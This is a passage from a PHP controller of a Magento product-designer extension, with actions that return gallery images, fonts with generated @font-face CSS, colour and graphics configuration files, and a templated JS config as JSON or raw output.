                  Mage::getBaseUrl(Mage_Core_Model_Store::URL_TYPE_WEB) . '/designer/images/patterns/10.png',
                  Mage::getBaseUrl(Mage_Core_Model_Store::URL_TYPE_WEB) . '/designer/images/patterns/11.png',
                  Mage::getBaseUrl(Mage_Core_Model_Store::URL_TYPE_WEB) . '/designer/images/patterns/12.png',
                  Mage::getBaseUrl(Mage_Core_Model_Store::URL_TYPE_WEB) . '/designer/images/patterns/13.png',
                  Mage::getBaseUrl(Mage_Core_Model_Store::URL_TYPE_WEB) . '/designer/images/patterns/14.png',
                  Mage::getBaseUrl(Mage_Core_Model_Store::URL_TYPE_WEB) . '/designer/images/patterns/15.png',
                  Mage::getBaseUrl(Mage_Core_Model_Store::URL_TYPE_WEB) . '/designer/images/patterns/16.png'
              ),
              */
              'bkg_patterns' => $patterns         
            );
        }

        echo json_encode(array('objects' => $objects));
    }
    
    public function getGalleryAction() {
        header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");
        header("Last-Modified: " . gmdate("D, d M Y H:i:s") . " GMT");
        header("Cache-Control: no-cache, must-revalidate");
        header("Pragma: no-cache");
        
        $collection = Mage::getModel('productdesigner/graphics')->getCollection()
                        ->setOrder('position', 'ASC');

        $gallery = array();
          
        if ($collection->getSize()) {
            foreach ($collection as $graph) {
                $gallery[] = array(
                        'title' => $graph->getName(),
                        'image' => Mage::getBaseUrl(Mage_Core_Model_Store::URL_TYPE_MEDIA) . $graph->getImage()
                    );
            }
        }
     
        echo json_encode(array('gallery' => $gallery));    
    }

    public function getFontsAction() {
        header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");
        header("Last-Modified: " . gmdate("D, d M Y H:i:s") . " GMT");
        header("Cache-Control: no-cache, must-revalidate");
        header("Pragma: no-cache");
        
        $collection = Mage::getModel('productdesigner/font')->getCollection()->setOrder('position', 'ASC');

        $fonts = array();
        $css = '';
        
        if ($collection->getSize()) {
            foreach ($collection as $font) {
                $fonts[] = array(
                        'name' => $font->getName()
                    );
                if($font->getFile()) {    
                    $css .= '@font-face {
                                font-family: ' . $font->getName() . ';
                                src: url("' . Mage::helper('productdesigner')->getFontsBaseUrl() . $font->getFile() . '") format("truetype");
                            }';
                }
            }
        }
       
        echo json_encode(array('css' => $css, 'fonts' => $fonts));
    }
    
    public function getColorsAction() {
        header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");
        header("Last-Modified: " . gmdate("D, d M Y H:i:s") . " GMT");
        header("Cache-Control: no-cache, must-revalidate");
        header("Pragma: no-cache");
        
        if($this->getExt() == 'xml') {
            header("Content-type: text/xml");
        }
        echo file_get_contents($this->getDesignerPath() . 'config/colors.' . $this->getExt());
    }
    
    public function getGraphicsAction() {
        header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");
        header("Last-Modified: " . gmdate("D, d M Y H:i:s") . " GMT");
        header("Cache-Control: no-cache, must-revalidate");
        header("Pragma: no-cache");
        
        if($this->getExt() == 'xml') {
            header("Content-type: text/xml");
        }
        echo file_get_contents($this->getDesignerPath() . 'config/graphics.' . $this->getExt());
    }
    
    public function getConfigAction() {
        header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");
        header("Last-Modified: " . gmdate("D, d M Y H:i:s") . " GMT");
        header("Cache-Control: no-cache, must-revalidate");
        header("Pragma: no-cache");
        
        $config =  file_get_contents($this->getDesignerPath() . 'js/config.js');
        $config = str_replace('${base_url}', Mage::getBaseUrl(Mage_Core_Model_Store::URL_TYPE_WEB), $config);
        $config = str_replace('${product_id}', Mage::getSingleton('core/session')->getCurrentProductId(), $config);
        echo $config;
    }
    
    protected function getDesignerPath() {
        return Mage::helper('productdesigner')->getDesignerPath();
    }
    
    protected function getExt() {
        return Mage::helper('productdesigner')->getDesignerTypeExt();
    }

}